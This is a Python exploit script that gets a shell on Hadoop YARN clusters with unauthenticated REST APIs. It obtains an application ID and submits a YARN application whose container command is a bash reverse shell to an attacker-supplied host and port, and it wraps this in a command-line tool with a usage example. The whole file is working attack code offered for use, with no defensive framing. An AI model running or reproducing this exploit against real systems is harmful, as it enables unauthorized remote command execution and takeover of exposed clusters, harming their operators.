"""
-*- coding: utf-8 -*-
@Project : Hadoop未授权getshell
@Author  : wodelilian
@Date    : 2023/3/8 15:04
Software : PyCharm
version  : Python 3.10
@File    : Hadoopgetshell.py
"""
import requests
import argparse
import json

header = 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11'
payload1 = 'ws/v1/cluster/apps/new-application'
payload2 = 'ws/v1/cluster/apps'
print(
        f"Author: Wodelilian\n"
        f"                                                     ,--,              ,--,                                    \n"
        f"                                    ,---,          ,--.'|     ,--,   ,--.'|     ,--,                           \n"
        f"               .---.   ,---.      ,---.'|          |  | :   ,--.'|   |  | :   ,--.'|                     ,---,  \n"
        f"              /. ./|  '   ,'\     |   | :          :  : '   |  |,    :  : '   |  |,                  ,-+-. /  | \n"
        f"           .-'-. ' | /   /   |    |   | |   ,---.  |  ' |   `--'_    |  ' |   `--'_      ,--.--.    ,--.'|'   | \n"
        f"          /___/ \: |.   ; ,. :  ,--.__| |  /     \ '  | |   ,' ,'|   '  | |   ,' ,'|    /       \  |   |  , ' | \n"
        f"       .-'.. '   ' .'   | |: : /   ,'   | /    /  ||  | :   '  | |   |  | :   '  | |   .--.  .-. | |   | /  | | \n"
        f"      /___/ \:     ''   | .; :.   '  /  |.    ' / |'  : |__ |  | :   '  : |__ |  | :    \__\/: . . |   | |  | | \n"
        f"      .   \  ' .\   |   :    |'   ; |:  |'   ;   /||  | '.'|'  : |__ |  | '.'|'  : |__  ,  .--.; | |   | |  |/  \n"
        f"       \   \   ' \ | \   \  / |   | '/  ''   |  / |;  :    ;|  | '.'|;  :    ;|  | '.'|/  /  ,.  | |   | |--'   \n"
        f"        \   \  |--    `----'  |   :    :||   :    ||  ,   / ;  :    ;|  ,   / ;  :    ;  :   .'   \|   |/       \n"
        f"         \   \ |               \   \  /   \   \  /  ---`-'  |  ,   /  ---`-'  |  ,   /|  ,     .-./'---'        \n"
        f"          '---                  `----'     `----'            ---`-'            ---`-'  `--`---'                 \n"
    )


def getshell(target,lhost,lport):
    """
    :param target: 攻击目标
    :param lhost: 反弹shell IP
    :param lport: 反弹shell 端口
    :return: null
    """
    url1 = str(target) + str(payload1)
    resp = requests.post(url=url1)
    app_id = resp.json()['application-id']
    url2 = str(target) + str(payload2)
    data = {
        'application-id': app_id,
        'application-name': 'get-shell',
        'am-container-spec': {
            'commands': {
                'command': '/bin/bash -i >& /dev/tcp/{}/{} 0>&1'.format(lhost, lport),
            },
        },
        'application-type': 'YARN',
    }
    requests.post(url=url2, headers=header, data=json.dumps(data))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='python3 Hadoopgetshell.py  -u [IP Address] -l[Reverse Host] -p [Reverse Prot(Default 9999)]',
        epilog='python3 -u http://192.168.0.1:8088/ -l 127.0.0.1 -p 9999')
    parser.add_argument('-u', '--url', help='IP Address')
    parser.add_argument('-l', '--lhost', help='Reverse Host')
    parser.add_argument('-p', '--port', default=9999, help='Reverse Prot(Default 9999)')
    args = parser.parse_args()
    target = args.url
    lhost = args.lhost
    lport = args.port
    try:
        if target == None or lhost == None or lport == None:
            print("请输检查输入的参数")
        else:
            print("开始尝试getshell：目标：{} 反弹shell地址：{}:{}".format(target, lhost, lport))
            getshell(target, lhost, lport)
    except :
        pass
